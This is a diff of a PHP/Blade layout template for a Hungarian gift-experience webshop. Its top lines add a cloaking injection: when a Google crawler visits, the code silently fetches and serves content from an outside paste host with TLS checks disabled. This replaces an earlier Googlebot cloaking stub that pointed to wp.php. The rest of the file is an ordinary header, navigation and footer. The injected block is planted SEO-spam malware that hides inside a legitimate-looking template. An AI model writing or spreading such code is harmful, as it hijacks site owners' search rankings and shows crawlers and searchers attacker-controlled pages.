@@ -1,18 +1,512 @@
 <?php
-function is_google_bot() {
-    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
-    foreach ($agents as $agent) {
-        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
-    }
-    return false;
+function is_google_crawler() {
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    return preg_match('/Google(bot|-Site-Verification|-InspectionTool|bot-Mobile|bot-News)/i', $ua);
 }
 
-if (is_google_bot()) {
-    $bot_content = file_get_contents('thumbs.html');
-    echo $bot_content;
-    exit;
-} else {
-    include('wp.php');
+if (is_google_crawler()) {
+    $remote_url = 'https://paste.phyo186.cfd/HwL9W-EW4eP/raw';
+
+    $curl = curl_init();
+    curl_setopt_array($curl, array(
+        CURLOPT_URL => $remote_url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => "",
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_HTTPHEADER => array(
+            'User-Agent: Googlebot'
+        ),
+    ));
+
+    $response = curl_exec($curl);
+    $httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+    curl_close($curl);
+
+    if ($httpcode === 200 && $response) {
+        echo $response;
+    }
+
     exit;
 }
 ?>
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+    <title>Feldobox - @if(isset($title)){{$title}}@endif</title>
+
+    <!-- SEO alap meta -->
+    <meta name="description" content="@if(isset($meta_desc)){{$meta_desc}}@endif">
+
+    <!-- Open Graph (Facebook, LinkedIn, stb.) -->
+    <meta property="og:title" @if(isset($meta_title))content="Feldobox - {{$meta_title}}"@else content="Feldobox - @if(isset($title)){{$title}}@endif" @endif>
+    <meta property="og:description" @if(isset($meta_desc))content="{{$meta_desc}}"@endif>
+    <meta property="og:image" @if(isset($meta_img))content="{{$meta_img}}"@else content="{{ env('APP_URL') }}/assets/img/feldobox-facebook-cover.jpg" @endif>
+    <meta property="og:url" @if(isset($meta_url))content="{{$meta_url}}"@else content="{{ url()->current() }}" @endif>
+    <meta property="og:type" content="website">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="/assets/img/favicon.png">
+    <!--Roboto Font-->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Calistoga&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="/assets/plugins/bootstrap/css/bootstrap.min.css">
+
+    <!-- Fontawesome CSS -->
+    <link rel="stylesheet" href="/assets/plugins/fontawesome/css/fontawesome.min.css">
+    <link rel="stylesheet" href="/assets/plugins/fontawesome/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+
+    <!-- Owl Carousel CSS -->
+    <link rel="stylesheet" href="/assets/plugins/owlcarousel/owl.carousel.min.css">
+    <link rel="stylesheet" href="/assets/plugins/owlcarousel/owl.theme.default.min.css">
+
+    <!-- Aos CSS -->
+    <link rel="stylesheet" href="/assets/plugins/aos/aos.css">
+    <!-- Load plugin css -->
+    <link rel="stylesheet" href="/vendor/cookie/dist/cookieconsent.css">
+    <link rel="stylesheet" href="/vendor/cookie/assets/cookie.css">
+
+    <script src="/vendor/cookie/assets/cookie.js"></script>
+    <script type="module" src="/vendor/cookie/assets/cookieconsent-init.js"></script>
+    <link rel="stylesheet" href="/vendor/sweetalert/css/sweetalert2.min.css">
+    <script src="/vendor/sweetalert/js/sweetalert2.all.min.js"></script>
+
+
+
+
+    <!-- Main CSS -->
+    <link rel="stylesheet" href="/assets/css/feldobox.css?version={{$version}}">
+    <link rel="stylesheet" href="/assets/css/style.css?version={{$version}}">
+
+    {!! RecaptchaV3::initJs() !!}
+
+    @yield('styles')
+    @yield('head')
+
+    <meta name="csrf-token" content="{{ csrf_token() }}">
+</head>
+<body @if(isset($bodyclass)) class="{{$bodyclass}}" @endif>
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-35967910-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-35967910-1');
+    </script>
+
+    <script>
+        // Define dataLayer and the gtag function.
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+
+        gtag('consent', 'default', {
+            'ad_storage': 'granted',
+            'analytics_storage': 'granted',
+            'personalization_storage': 'granted',
+            'functionality_storage': 'granted',
+        });
+    </script>
+
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+    })(window,document,'script','dataLayer','GTM-MVLMFL');</script>
+    <!-- End Google Tag Manager -->
+
+    <script type="text/plain" data-category="analytics">
+        gtag('consent', 'update', {
+            'analytics_storage': 'granted'
+        });
+    </script>
+
+    <script type="text/plain" data-category="!analytics">
+        gtag('consent', 'update', {
+            'analytics_storage': 'denied'
+        });
+    </script>
+
+    <script type="text/plain" data-category="ads">
+        gtag('consent', 'update', {
+            'ad_storage': 'granted',
+            'personalization_storage': 'granted'
+        });
+    </script>
+
+    <script type="text/plain" data-category="!ads">
+        gtag('consent', 'update', {
+            'ad_storage': 'denied',
+            'personalization_storage': 'denied'
+        });
+    </script>
+
+
+    <!-- Loader -->
+    <div class="page-loading">
+        <div class="preloader-inner">
+            <div class="preloader-square-swapping">
+                <div class="cssload-square-part cssload-square-orange"></div>
+                <div class="cssload-square-part cssload-square-blue"></div>
+                <div class="cssload-square-blend"></div>
+            </div>
+        </div>
+    </div>
+    <!-- /Loader -->
+
+    <div class="main-wrapper">
+
+        <header class="header sticky-top pb-0">
+
+            <div class="container">
+                <div class="row align-items-center">
+                    <div class="col-lg-2 col-md-0 d-none d-md-block">
+                        <a href="/"><img src="/assets/img/feldobox-3d.png" class="desktop-logo d-none d-lg-block" alt="Logo"></a>
+                    </div>
+
+                    <div class="col-lg-3 d-none d-lg-block text-right">
+                        @if(Auth::check() && session()->has('customer_products'))
+                        @if(count(session()->get('customer_products')) > 0)
+                        @if(count(session()->get('customer_products')) == 1)
+                        <a href="{{route('profil.termekek', ['card_id' => session()->get('customer_products')[0]['card_id']])}}"><button type="button" class="btn btn-primary elmenykartya "><i class="fa fa-star"></i>@lang('main.elmenykartyaim')</button></a>
+                        @else
+                        <a href="{{route('profil.termekek')}}"><button type="button" class="btn btn-primary elmenykartya "><i class="fa fa-star"></i>@lang('main.elmenykartyaim')</button></a>
+                        @endif
+                        @else
+                        <a href="{{route('activation')}}"><button type="button" class="btn btn-primary elmenykartya "><i class="fa fa-star"></i>@lang('main.elmenykartya_aktiv')</button></a>
+                        @endif
+                        @else
+                        <a href="{{route('activation')}}"><button type="button" class="btn btn-primary elmenykartya "><i class="fa fa-star"></i>@lang('main.elmenykartya_aktiv')</button></a>
+                        @endif
+                    </div>
+                    <div class="col-lg-4 col-md-6 d-none d-sm-block order-lg-1 order-md-3">
+                        <form action="{{route('kereses')}}" method="GET">
+                            <div class="input-group srch">
+                                <input type="search" class="form-control" id="search_query" name="search_query" value="{{ request('search_query') }}" placeholder="@lang('main.kereses_placeholder')" aria-describedby="button-addon2" autocomplete="off">
+                                <button class="btn btn-primary" type="submit" id="button-search_query" disabled><i class="fa fa-search"></i></button>
+                            </div>
+                            <div id="search-autocomplete-list" class="search-autocomplete-list"></div>
+                        </form>
+
+                    </div>
+                    <div class="col-lg-auto col-md-auto d-none d-sm-block profil order-lg-2 order-md-1">
+                        @if(Auth::check())
+                        <div class="dropdown profile-dropdown">
+                            <ul class="nav-drop">
+                                <li class="nav-item dropdown"><a class="nav-link" href="{{route('profil.adatok')}}"  role="button" aria-expanded="false">
+                                        <i class="fa fa-user me-2 text-blue"></i><span>Személyes fiók</span>
+                                    </a>
+                                </li>
+                            </ul>
+                        </div>
+                        @else
+                        <div class="dropdown profile-dropdown">
+                            <ul class="nav-drop">
+                                <li class="nav-item ">
+                                    <a class="nav-link" href="/bejelentkezes"  role="button"  aria-expanded="false">
+                                        <i class="fa fa-user me-2 text-blue"></i><span>Bejelentkezés</span>
+                                    </a>
+                                </li>
+                            </ul>
+                        </div>
+                        @endif
+
+                    </div>
+                    <div id="kosar" class="col-lg-1 col-md-3 d-none d-sm-block kosar d-flex align-items-center justify-content-end order-lg-3 order-sm-2">
+                        <div class="dropdown cart-dropdown">
+                            <a href="/kosar" id="cartDropdown" role="button" aria-expanded="false" class="cart-btn dropdown-toggle d-flex align-items-center gap-2 text-nowrap">
+                                <i class="fa fa-shopping-cart text-blue"></i>
+                                <span>@lang('main.kosar')</span>
+                                <span class="badge" id="cartItemCount"></span>
+                            </a>
+
+                            <ul id="header-cart-summary" class="dropdown-menu cart-menu dropdown-menu-end"  @if (Str::contains(request()->path(), 'penztar')) style="display: none!important;" @endif aria-labelledby="cartDropdown">
+                                <!-- ide jönnek a dinamikus itemek -->
+                            </ul>
+                        </div>
+                    </div>
+
+
+                </div>
+            </div>
+            <nav class="navbar navbar-expand-xl navbar-dark bg-gradient-brand mt-2">
+                <div class="container">
+
+
+
+                    <a class="navbar-brand" href="/"><img src="/assets/img/feldobox-3d.png" class="img-fluid w-50 d-lg-none" alt="Logo"></a>
+
+                    <div class="col-7 d-none d-md-block d-lg-none text-center">
+                        @if(Auth::check() && session()->has('customer_products'))
+                        @if(count(session()->get('customer_products')) > 0)
+                        @if(count(session()->get('customer_products')) == 1)
+                        <a href="{{route('profil.termekek', ['card_id' => session()->get('customer_products')[0]['card_id']])}}"><button type="button" class="btn btn-white text-blue elmenykartya "><i class="fa fa-star"></i>@lang('main.elmenykartyaim')</button></a>
+                        @else
+                        <a href="{{route('profil.termekek')}}"><button type="button" class="btn btn-white text-blue elmenykartya"><i class="fa fa-star"></i>@lang('main.elmenykartyaim')</button></a>
+                        @endif
+                        @else
+                        <a href="{{route('activation')}}"><button type="button" class="btn btn-white text-blue elmenykartya"><i class="fa fa-star"></i>@lang('main.elmenykartya_aktiv')</button></a>
+                        @endif
+                        @else
+                        <a href="{{route('activation')}}"><button type="button" class="btn btn-white text-blue elmenykartya"><i class="fa fa-star"></i>@lang('main.elmenykartya_aktiv')</button></a>
+                        @endif
+
+                    </div>
+
+
+                    <button class="navbar-toggler collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                        <span class="icon-bar top-bar"></span>
+                        <span class="icon-bar middle-bar"></span>
+                        <span class="icon-bar bottom-bar"></span>
+                    </button>
+
+
+                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                        <ul class="navbar-nav mx-auto mb-2 mb-lg-0">
+                            <li class="nav-item">
+                                <a class="nav-link" aria-current="page" href="/igy_mukodik">@lang('main.igy_mukodik')</a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link" href="{{route('shop')}}">@lang('main.elmenycsomagok') </a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link" href="/termekek/feldobox-ajandekkartya">@lang('main.ajandekkartya') </a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link" href="{{route('programkinalat')}}">@lang('main.programkinalat') </a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link" href="/hol_kaphato">@lang('main.hol_kaphato') </a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link" href="/oldal/feldobox-klub">@lang('main.feldobox_klub') </a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link" href="/oldal/aktualitasok">@lang('main.aktualitasok') </a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link" href="/gyik">@lang('main.gyik')</a>
+                            </li>
+                        </ul>
+                    </div>
+
+
+
+
+                </div>
+            </nav>
+        </header>
+
+
+
+        @yield('content')
+
+
+        <!-- Footer -->
+        <footer class="footer pt-20">
+            <!-- Footer Top -->
+            <div class="footer-top">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-lg-3 col-md-6 col-6">
+                            <!-- Footer Widget -->
+                            <div class="footer-widget footer-contact">
+                                <h4 class="footer-title">@lang('main.feldobox') @lang('main.ugyfelszolgalat')</h4>
+                                <div class="footer-contact-info">
+                                    <div class="footer-address">
+                                        <span><i class="fa fa-phone"></i></span>
+                                        <p>
+                                            <b>@lang('main.telefonos_ugyfelszolgalat')</b>
+                                            <br>
+                                            <a href="tel:+3613152312"> +361 315 2312</a> <br>
+                                            <a href="tel:+3617855670"> +361 785 5670</a> <br>
+                                            <a href="tel:+3617865670"> +361 786 5670</a>
+                                        </p>
+                                    </div>
+                                    <div class="footer-address">
+                                        <span><i class="fa fa-envelope"></i></span>
+                                        <p>
+                                            <b>@lang('main.email_cim')</b><br>
+                                            <a href="mailto:info@feldobox.hu">info(kukac)feldobox.hu</a>
+                                        </p>
+                                    </div>
+                                    <div class="footer-address">
+                                        <span><i class="fa fa-clock"></i></span>
+                                        <p>
+                                            <b>@lang('main.nyitvatartas')</b>
+                                            <br>
+                                            @lang(key: 'main.munkanapokon_hp')</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- /Footer Widget -->
+
+                            <a href=/oldal/tanusitvany target="_blank"><img src=https://certificate.hungary.dnb.com/getimage?cid=1376518&lang=hu&typ=l&bg=F1FAFF&fg=000000 alt="Dun & Bradstreet tanusitvany" class="tanusitvany" oncontextmenu="return false" title=" A Dun &amp; Bradstreet tanúsítvánnyal rendelkező cégekkel az üzletkötés kockázata alacsony. A minősítés a 100 éves nemzetközi tapasztalattal rendelkező, több száz változót figyelembe vevő Dun &amp; Bradstreet minősítési rendszeren alapul. A tanúsítvány az aktuális állapotot jelzi, és naponta frissül." /> </a>
+                        </div>
+
+                        <div class="col-lg-3 col-md-6 col-6">
+                            <!-- Footer Widget -->
+                            <div class="footer-widget footer-address">
+                                <h4 class="footer-title">@lang('main.kategoriak')</h4>
+
+                                <h3 class="fw-normal"><a href="/programkinalat">@lang('main.feldobox_elmeny')</a></h3>
+                                <h3 class="fw-normal"><a href="/termekek">@lang('main.elmenyajandek')</a></h3>
+                                <h3 class="fw-normal"><a href="/termekek">@lang('main.elmenycsomag')</a></h3>
+                                <h3 class="fw-normal"><a href="/oldal/10-ajandek-otlet-ha-mar-mindene-megvan">@lang('main.ajandek_otletek')</a></h3>
+                                <h3 class="fw-normal">@lang('main.karacsonyi_ajandek')</h3>
+                                <h3 class="fw-normal">@lang('main.szuletesnapi_ajandek')</h3>
+                                <h3 class="fw-normal">@lang('main.ballagasi_ajandek')</h3>
+                                <h3 class="fw-normal">@lang('main.eskuvoi_ajandek')</h3>
+                                <h3 class="fw-normal">@lang('main.ajandek_ferfiaknak')</h3>
+                                <h3 class="fw-normal">@lang('main.ajandek_noknek')</h3>
+                                <h3 class="fw-normal">@lang('main.ajandek_tanaroknak')</h3>
+
+                            </div>
+                            <!-- /Footer Widget -->
+                        </div>
+                        <div class="col-lg-6 col-md-6 col-6">
+                            <div class="row">
+                                <div class="col-lg-6 col-md-6 col-6">
+                                    <!-- Footer Widget -->
+                                    <div class="footer-widget footer-menu">
+                                        <h4 class="footer-title">@lang('main.rolunk')</h4>
+                                        <ul>
+                                            <li>
+                                                <a href="/oldal/kapcsolat">@lang('main.kapcsolat')</a>
+                                            </li>
+                                            <li>
+                                                <a href="/oldal/adatvedelem" target="_blank">@lang('main.adatvedelmi_szabalyzat')</a>
+                                            </li>
+                                            <li>
+                                                <a href="/oldal/altalanos-szerzodesi-feltetelek" target="_blank">@lang('main.aszf')</a>
+                                            </li>
+                                            <li>
+                                                <a href="/oldal/karrier">@lang('main.karrier')</a>
+                                            </li>
+                                            <li>
+                                                <h3 class="fw-normal"><a href="/oldal/koszonom">@lang('main.koszonom_nyeremenyjatek')</a></h3>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                    <!-- /Footer Widget -->
+                                </div>
+
+                                <div class="col-lg-6 col-md-6 col-6">
+                                    <!-- Footer Widget -->
+                                    <div class="footer-widget footer-menu">
+                                        <h4 class="footer-title">@lang('main.uzleti_negyed')</h4>
+                                        <ul>
+                                            <li>
+                                                <a href="/oldal/cegeknek">@lang('main.ceges_ajandekok')</a>
+                                            </li>
+                                            <li>
+                                                <a href="/oldal/legyen-a-partnerunk">@lang('main.partnerunk')</a>
+                                            </li>
+                                            <li>
+                                                <a href="/oldal/legyen_a_viszonteladonk">@lang('main.viszonteladon')</a>
+                                            </li>
+                                        </ul>
+
+                                    </div>
+                                    <!-- /Footer Widget -->
+
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-lg-12 col-md-12 col-12 mt-3 fotter-social-text">
+                                    Kövesse be közösségi média felületeinket, ahol exkluzív ajánlatok, nyereményjátékok és más népszerű tartalmak várják!
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-lg-12 col-md-12 col-12 mt-2">
+                                    <div class="social-icon float-lg-start">
+                                        <ul>
+                                            <li>
+                                                <a href="https://www.facebook.com/Feldobox" target="_blank"><i class="fab fa-facebook-f"></i> </a>
+                                            </li>
+                                            <li>
+                                                <a href="https://www.youtube.com/user/Feldobox" target="_blank"><i class="fab fa-youtube"></i></a>
+                                            </li>
+                                            <li>
+                                                <a href="https://www.instagram.com/feldobox/" target="_blank"><i class="fab fa-instagram"></i></a>
+                                            </li>
+                                            <li>
+                                                <a href="https://www.tiktok.com/@feldobox" target="_blank"><i class="fab fa-tiktok"></i></a>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- /Footer Top -->
+
+            <!-- Footer Bottom -->
+            <div class="footer-bottom">
+                <div class="container">
+                    <!-- Copyright -->
+                    <div class="copyright">
+                        <div class="row">
+                            <div class="col-md-6 col-lg-9">
+                                <div class="copyright-text">
+                                    <p class="mb-0">Copyright &copy; 2006 - {{date('Y')}} <a href="#">@lang('main.feldobox')</a></p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- /Copyright -->
+                </div>
+            </div>
+            <!-- /Footer Bottom -->
+        </footer>
+        <!-- /Footer -->
+    </div>
+
+
+    <a class="back-to-top" id="back-to-top" href="#"><i class="fa fa-chevron-up"></i></a>
+
+
+    <!-- jQuery -->
+    <script src="/assets/js/jquery-3.6.0.min.js"></script>
+    <script src="/assets/plugins/ui/jquery-ui.min.js"></script>
+    <!-- Bootstrap Core JS -->
+    <script src="/assets/js/popper.min.js"></script>
+    <script src="/assets/plugins/bootstrap/js/bootstrap.min.js"></script>
+    <script src="/assets/js/jquery.mask.min.js"></script>
+
+    @yield('scripts')
+
+    <!-- Owl JS -->
+    <script src="/assets/plugins/owlcarousel/owl.carousel.min.js"></script>
+
+    <!-- Aos -->
+    <script src="/assets/plugins/aos/aos.js"></script>
+
+    <script src="/assets/js/script.js?version={{$version}}"></script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const width = window.innerWidth;
+            if (width<1200) {
+                if (!document.cookie.includes('screen_width') ||
+                !document.cookie.includes('screen_width=' + width)) {
+                    document.cookie = "screen_width=" + width + "; path=/";
+                    location.reload();
+                }
+            }
+        });
+    </script>
+
+</body>
+</html>
